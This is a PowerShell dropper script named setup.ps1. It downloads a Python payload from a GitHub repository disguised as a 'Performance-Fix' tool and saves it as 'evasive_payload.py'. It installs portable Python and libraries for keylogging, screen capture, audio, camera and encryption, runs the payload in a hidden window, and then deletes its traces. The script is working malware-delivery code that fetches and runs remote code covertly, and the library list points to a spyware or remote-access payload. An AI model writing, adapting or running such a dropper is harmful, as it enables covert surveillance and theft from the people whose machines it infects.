# setup.ps1 - Silent installer for Python, dependencies, and payload execution
$ErrorActionPreference = "SilentlyContinue"
$tempDir = "$env:TEMP\py_install"
New-Item -ItemType Directory -Force -Path $tempDir | Out-Null

# URLs – UPDATE THESE
$payloadUrl = "https://raw.githubusercontent.com/fortnite0712102-dot/Performance-Fix/9907a257db922546e32170549fde18c654953d36/WindowsHelper.py"
$pythonZipUrl = "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip"
$getPipUrl = "https://bootstrap.pypa.io/get-pip.py"

$payloadPath = "$env:TEMP\evasive_payload.py"
$pythonPath = "$env:TEMP\python_embed"
$pythonExe = "$pythonPath\python.exe"

# Download payload first
Write-Host "[*] Downloading payload..."
Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing

# Check if Python is available; if not, download and extract portable Python
if (-not (Get-Command python.exe -ErrorAction SilentlyContinue) -and -not (Test-Path $pythonExe)) {
    Write-Host "[*] Downloading portable Python..."
    $zipPath = "$tempDir\python.zip"
    Invoke-WebRequest -Uri $pythonZipUrl -OutFile $zipPath -UseBasicParsing
    Expand-Archive -Path $zipPath -DestinationPath $pythonPath -Force
    Write-Host "[*] Python extracted to $pythonPath"
}

# Determine which Python to use
if (Test-Path $pythonExe) {
    $pythonCmd = $pythonExe
    # For embeddable Python, we need to install pip
    Write-Host "[*] Installing pip for portable Python..."
    $getPipPath = "$tempDir\get-pip.py"
    Invoke-WebRequest -Uri $getPipUrl -OutFile $getPipPath -UseBasicParsing
    & $pythonCmd $getPipPath --quiet
    # Add Scripts folder to PATH temporarily
    $env:Path = "$pythonPath\Scripts;$env:Path"
} else {
    $pythonCmd = "python.exe"
}

# Install required packages
Write-Host "[*] Installing required Python packages (this may take a minute)..."
$packages = @("cryptography", "pynput", "mss", "pillow", "psutil", "requests", "numpy", "opencv-python", "pyaudio", "pywin32")
foreach ($pkg in $packages) {
    & $pythonCmd -m pip install $pkg --quiet --disable-pip-version-check --no-warn-script-location --user
}

# Execute payload hidden
Write-Host "[*] Launching payload..."
Start-Process -FilePath $pythonCmd -ArgumentList $payloadPath -WindowStyle Hidden

# Cleanup (optional – remove after 10 seconds)
Start-Sleep -Seconds 10
Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path $pythonPath -Recurse -Force -ErrorAction SilentlyContinue

Write-Host "[+] Setup complete. Payload running."